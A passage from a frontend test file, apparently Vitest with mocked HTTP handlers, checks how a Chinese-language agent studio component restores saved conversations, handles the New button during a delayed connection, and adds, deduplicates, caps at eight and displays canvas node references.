    server.use(http.get('*/agent-studio/api/state', () => HttpResponse.json({ connected: true, session_scope: 'account-2', workspace_id: 54, runs: [] })))
    render(<DeepAgentStudio apiBase="/agent-studio" />)
    await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
    expect(reads).toBe(oldReads)
  })
})

it('New clicked during delayed connection prevents saved conversation restoration', async () => {
  const key = 'dodo-conversation:' + JSON.stringify(['/agent-studio', 'account-1', null])
  sessionStorage.setItem(key, 'run1')
  let release!: () => void
  const ready = new Promise<void>(resolve => { release = resolve })
  const requested = vi.fn()
  server.use(http.get('*/agent-studio/api/state', async () => {
    requested()
    await ready
    return HttpResponse.json({ connected: true, session_scope: 'account-1', workspace_id: 54, runs: [] })
  }))
  render(<DeepAgentStudio apiBase="/agent-studio" />)
  await waitFor(() => expect(requested).toHaveBeenCalled())
  fireEvent.click(screen.getByRole('button', { name: '新建会话' }))
  release()
  await waitFor(() => expect(screen.getByRole('button', { name: '上传图片或剧本' })).toBeEnabled())
  expect(sessionStorage.getItem(key)).toBeNull()
  expect(Socket.instances).toHaveLength(0)
})

it('adds clicked canvas references without sending, deduplicates and submits only node IDs', async () => {
  const starts: unknown[] = []
  server.use(http.post('*/agent-studio/api/runs', async ({ request }) => {
    starts.push(await request.json())
    return HttpResponse.json({ detail: 'fixture rejected' }, { status: 400 })
  }))
  const { rerender } = render(<DeepAgentStudio canvasId={57} />)
  await openHistory()
  rerender(<DeepAgentStudio canvasId={57} canvasReference={{ id: 'episode-1', title: '第一集字幕版', kind: 'video' }} />)
  expect(await screen.findByRole('button', { name: '移除引用 第一集字幕版' })).toBeVisible()
  rerender(<DeepAgentStudio canvasId={57} canvasReference={{ id: 'episode-1', title: '第一集字幕版', kind: 'video' }} />)
  expect(screen.getAllByRole('button', { name: '移除引用 第一集字幕版' })).toHaveLength(1)
  expect(starts).toHaveLength(0)
  fireEvent.change(screen.getByRole('textbox', { name: '创作要求' }), { target: { value: '查看这个节点，不生成' } })
  fireEvent.click(screen.getByRole('button', { name: '发送创作要求' }))
  await waitFor(() => expect(starts).toHaveLength(1))
  expect(starts[0]).toMatchObject({ canvas_id: 57, canvas_references: ['episode-1'], message: '查看这个节点，不生成' })
  expect(await screen.findByRole('button', { name: '移除引用 第一集字幕版' })).toBeVisible()
  fireEvent.click(screen.getByRole('button', { name: '移除引用 第一集字幕版' }))
  expect(screen.queryByRole('button', { name: '移除引用 第一集字幕版' })).not.toBeInTheDocument()
})

it('limits references to eight and clears them for a new conversation', async () => {
  const { rerender } = render(<DeepAgentStudio canvasId={57} />)
  await openHistory()
  for (let i = 0; i < 9; i++) {
    rerender(<DeepAgentStudio canvasId={57} canvasReference={{ id: `node-${i}`, title: `节点 ${i}`, kind: 'text' }} />)
  }
  expect(screen.getAllByRole('button', { name: /^移除引用/ })).toHaveLength(8)
  expect(screen.queryByRole('button', { name: '移除引用 节点 8' })).not.toBeInTheDocument()
  fireEvent.click(screen.getByRole('button', { name: '新建会话' }))
  expect(screen.queryByRole('button', { name: /^移除引用/ })).not.toBeInTheDocument()
})

it('shows submitted node references in the conversation without embedding the full node', () => {
  render(<EventCard event={{ id:'referenced', kind:'user', text:'查看这一集', data:{ canvas_references:[{ id:'n1', title:'第一集字幕版' }] } }} />)
  expect(screen.getByLabelText('本条消息引用的节点')).toHaveTextContent('引用 · 第一集字幕版')
})
